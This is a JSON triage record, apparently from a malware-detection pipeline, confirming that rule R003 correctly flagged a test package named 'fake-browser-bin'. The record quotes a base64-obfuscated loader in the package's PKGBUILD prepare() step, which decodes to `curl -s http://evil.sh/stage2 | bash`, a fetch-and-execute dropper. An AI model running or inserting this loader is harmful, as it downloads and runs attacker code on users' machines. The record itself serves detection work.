@@ -1,0 +1,45 @@
+{
+  "alert_slug": "historical/r003-tp",
+  "confidence": "high",
+  "overall": "TP",
+  "package": "fake-browser-bin",
+  "rules": [
+    {
+      "agree": true,
+      "bad_practice_present": true,
+      "citation": "decoded payloads (runtime-decoded; trust these): curl -s http://evil.sh/stage2 | bash",
+      "cited": true,
+      "class": "true_positive",
+      "confidence": "high",
+      "ioc_entries": [
+        {
+          "confidence": "high",
+          "provenance": "decoded payload in PKGBUILD prepare() (the `echo 'Y3VybCAtcyBodHRwOi8vZXZpbC5zaC9zdGFnZTIgfCBiYXNo' | base64 -d | bash` string decodes to curl against http://evil.sh/stage2)",
+          "type": "domain",
+          "value": "evil.sh"
+        }
+      ],
+      "malicious_behaviour_present": true,
+      "malicious_citation": "curl -s http://evil.sh/stage2 | bash",
+      "malicious_citation_grounded": true,
+      "malicious_reasoning": "The runtime-decoded payloads show 'curl -s http://evil.sh/stage2 | bash', a classic stage-2 dropper that downloads and executes from an evil host; the only obfuscation is base64, which the runtime already stripped for us.",
+      "reasoning": "The base64 payload decodes to an actual `curl ... | bash` command that fetches from evil.sh and pipes to a shell, so it is real malware staging executed at build time, not merely text printed for the reader; the rule is right to surface this.",
+      "resolution": "The `prepare()` function in the PKGBUILD decodes a Base64 string and pipes it to `bash`, executing `curl -s http://evil.sh/stage2 | bash`. This is a genuine fetch-and-execute payload hidden through Base64 obfuscation, so no change to the recipe is warranted; instead, do not install this package and escalate to the AUR maintainer (Alice).",
+      "rule_id": "R003",
+      "samples": [
+        [
+          "True",
+          "True"
+        ],
+        [
+          "True",
+          "True"
+        ]
+      ],
+      "tp_twin": "A `base64 -d` that decodes to a command reaching an external host via curl piped into a shell, e.g. `curl -s http://evil.sh/stage2 | bash`, must keep firing.",
+      "where": "PKGBUILD prepare() function at line 14"
+    }
+  ],
+  "score": 80,
+  "score_threshold": 20
+}
